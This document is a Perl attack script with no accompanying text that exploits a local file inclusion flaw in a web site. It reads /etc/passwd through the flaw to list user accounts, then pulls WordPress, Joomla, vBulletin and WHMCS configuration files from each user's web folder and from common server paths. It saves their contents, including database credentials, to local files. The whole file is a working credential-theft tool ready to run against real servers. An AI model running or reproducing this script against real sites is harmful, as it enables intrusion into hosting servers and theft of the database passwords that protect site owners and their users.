use LWP::UserAgent;
use Data::Dumper;
use Term::ANSIColor;
use Getopt::Long;
GetOptions(
'www=s' => \$lfiu,
);
sub ris{
	$ris = LWP::UserAgent->new(keep_alive => 1);
	$ris->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12');
	$ris->timeout(10);
	$rixs = $ris->get(@_[0]);
	return $rixs->code;
}
if(!$lfiu){
	print colored["red"],"[-] Usage : perl ".$0." -www [Full LFI url]"."\n";
	exit;
	}
sub repo{
	$rep = LWP::UserAgent->new(keep_alive => 1);
	$rep->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12');
	$rep->timeout(10);
	$frep = $rep->get(@_[0]);
	return $frep->content;
}
@spike = ('/var/www/wp/wp-config.php','/var/www/html/wordpress/wp-config.php' , '/var/www/WP/wp-config.php' , '/var/www/wp/beta/wp-config.php' , '/var/www/beta/wp-config.php' , '/var/www/press/wp-config.php' , '/var/www/wordpress/wp-config.php' , '/var/www/Wordpress/wp-config.php' , '/var/www/blog/wp-config.php' , '/var/www/config.php' , '/var/www/news/wp-config.php' , '/var/www/new/wp-config.php' , '/var/www/blog/wp-config.php' , '/var/www/beta/wp-config.php' , '/var/www/blogs/wp-config.php' , '/var/www/home/wp-config.php' , '/var/www/db.php' , '/var/www/site/wp-config.php' , '/var/www/main/wp-config.php' , '/var/www/configuration.php' , '/var/www/joomla/configuration.php' , '/var/www/portal/configuration.php' , '/var/www/joo/configuration.php' , '/var/www/cms/configuration.php' , '/var/www/site/configuration.php' , '/var/www/main/configuration.php' , '/var/www/news/configuration.php' , '/var/www/new/configuration.php' , '/var/www/home/configuration.php' , '/var/www/vb/includes/config.php' , '/var/www/whm/configuration.php' , '/var/www/central/configuration.php' , '/var/www/whm/whmcs/configuration.php' , '/var/www/whm/WHMCS/configuration.php' , '/var/www/whmc/WHM/configuration.php' , '/var/www/whmcs/configuration.php' , '/var/www/support/configuration.php' , '/var/www/configuration.php' , '/var/www/submitticket.php' , '/var/www/whm/configuration.php');
$res = repo($lfiu."/etc/passwd");
%pe = ('wp-config.php' => '-wp13.txt','wp/wp-config.php' => '-wp13-wp.txt','WP/wp-config.php' => '-wp13-WP.txt','wp/beta/wp-config.php' => '-wp13-wp-beta.txt','beta/wp-config.php' => '-wp13-beta.txt','press/wp-config.php' => '-wp13-press.txt','wordpress/wp-config.php' => '-wp13-wordpress.txt','Wordpress/wp-config.php' => '-wp13-Wordpress.txt','blog/wp-config.php' => '-wp13-Wordpress.txt','config.php' => '-configgg.txt','news/wp-config.php' => '-wp13-news.txt','new/wp-config.php' => '-wp13-new.txt','blog/wp-config.php' => '-wp-blog.txt','beta/wp-config.php' => '-wp-beta.txt','blogs/wp-config.php' => '-wp-blogs.txt','home/wp-config.php' => '-wp-home.txt','db.php' => '-dbconf.txt','site/wp-config.php' => '-wp-site.txt','main/wp-config.php' => '-wp-main.txt','configuration.php' => '-wp-test.txt','joomla/configuration.php' => '-joomla2.txt','portal/configuration.php' => '-joomla-protal.txt','joo/configuration.php' => '-joo.txt','cms/configuration.php' => '-joomla-cms.txt','site/configuration.php' => '-joomla-site.txt','main/configuration.php' => '-joomla-main.txt','news/configuration.php' => '-joomla-news.txt','new/configuration.php' => '-joomla-new.txt','home/configuration.php' => '-joomla-home.txt','vb/includes/config.php' => '-vb-config.txt','whm/configuration.php' => '-whm15.txt','central/configuration.php' => '-whm-central.txt','whm/whmcs/configuration.php' => '-whm-whmcs.txt','whm/WHMCS/configuration.php' => '-whm-WHMCS.txt','whmc/WHM/configuration.php' => '-whmc-WHM.txt','whmcs/configuration.php' => '-whmcs.txt','support/configuration.php' => '-support.txt','configuration.php' => '-joomla.txt','submitticket.php' => '-whmcs2.txt','whm/configuration.php' => '-whm.txt');
while($res =~ m/(.*):x:/g){
	while(($po , $lv) = each %pe){
		if(ris($lfiu.$spk) < 399 and not repo($lfiu.$spk ) =~ /400/ and not ris($lfiu.$spk) > 399 and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /Page Not/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /e>404/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /Server at/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /404 Not Found/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /<title>404 Not Found<\/title>/ and length(repo($lfiu."/home/".$1."/public_html/".$po)) > 14 and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /Page Not/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /Not Found/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ / error/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /error / and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /<script/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /<style/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /<h1>/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /<\/h1>/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /Port 80/ and not repo($lfiu."/home/".$1."/public_html/".$po) =~ /<p>The requested URL \/wo was not found on this server.<\/p>/){
		print colored["green"],"[*] OK : "."/home/".$1."/public_html/".$po."\n";
		open(DL,'>>'.$lv);
		print DL repo($lfiu."/home/".$1."/public_html/".$po);
		}
	}
}
foreach $spk (@spike){
	if(ris($lfiu.$spk) < 399 and not repo($lfiu.$spk ) =~ /Page Not/ and not repo($lfiu.$spk ) =~ /e>404/ and not repo($lfiu.$spk ) =~ /Server at/ and not repo($lfiu.$spk ) =~ /404 Not Found/ and not repo($lfiu.$spk ) =~ /<title>404 Not Found<\/title>/ and length(repo($lfiu.$spk )) > 14 and not repo($lfiu.$spk ) =~ /Page Not/ and not repo($lfiu.$spk ) =~ /Not Found/ and not repo($lfiu.$spk ) =~ / error/ and not repo($lfiu.$spk ) =~ /error / and not repo($lfiu.$spk ) =~ /<script/ and not repo($lfiu.$spk ) =~ /<style/ and not repo($lfiu.$spk ) =~ /<h1>/ and not repo($lfiu.$spk ) =~ /<\/h1>/ and not repo($lfiu.$spk ) =~ /Port 80/ and not repo($lfiu.$spk ) =~ /<p>The requested URL \/wo was not found on this server.<\/p>/){
		open(RDL,'>>'."alonelypath".rand().'-configuration.txt');
		print RDL repo($lfiu.$spk);
		print colored["green"],"[*] OK : ".$spk."\n";
		}
	}